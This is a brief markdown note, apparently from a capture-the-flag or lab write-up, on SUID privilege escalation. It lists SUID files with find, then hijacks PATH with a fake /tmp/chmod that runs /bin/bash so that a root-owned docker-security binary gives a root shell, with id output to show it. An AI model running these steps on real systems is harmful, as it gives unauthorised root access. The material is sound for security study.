# docker

## docker-security suid privilege escalation

> SUID (Set owner User ID up on execution) is a special type of file permissions given to a file. Normally in Linux/Unix when a program runs, it inherits access permissions from the logged in user. SUID is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather that the user who runs it.

1. find suid permissions

        $ find / -perm -u=s -type f 2>/dev/null

2. overwrite used binary by bash

        $ ls -l /usr/local/bin/docker-security
        -rwsr-xr-x 1 root mortal 16720 Feb 15 20:00 /usr/local/bin/docker-security
        $ cd /usr/local/bin/
        $ echo "/bin/bash" > /tmp/chmod
        $ chmod 777 /tmp/chmod
        $ export PATH=/tmp:$PATH
        $ echo $PATH
        /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
        $ ./docker-security
        # id
        uid=0(root) gid=0(root) groups=0(root)
